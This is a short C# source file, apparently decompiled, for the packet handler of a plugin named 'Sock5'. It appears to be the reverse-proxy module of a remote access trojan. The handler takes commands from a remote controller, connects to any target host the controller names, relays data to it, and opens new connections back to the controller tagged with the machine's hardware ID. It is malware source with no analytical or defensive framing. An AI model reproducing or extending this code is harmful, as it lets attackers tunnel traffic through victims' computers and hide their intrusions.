using System;
using Leb128;
using Plugin.Helper;
using Plugin.Sock5;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data, Client client)
	{
		try
		{
			object[] array = LEB128.Read(data);
			switch ((string)array[0])
			{
			case "Pack":
				Plugin.TagProxy = (string)array[1];
				break;
			case "Connect":
				client.client = new ReverseProxyClient((string)array[1], (int)array[2], client);
				break;
			case "Data":
				client.client.SendToTargetServer((byte[])array[1]);
				break;
			case "Disconnect":
				client.client.Disconnect();
				break;
			case "Accept":
			{
				Client client2 = new Client();
				client2.Connect(Plugin.tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[0], Plugin.tcpClient.RemoteEndPoint.ToString().Split(new char[1] { ':' })[1], itsmain: false);
				client2.Send(LEB128.Write(new object[5]
				{
					Plugin.TagProxy,
					"Accept",
					array[1],
					Plugin.hwid,
					array[2]
				}));
				break;
			}
			}
		}
		catch (Exception ex)
		{
			client.Error(ex.ToString());
		}
	}
}
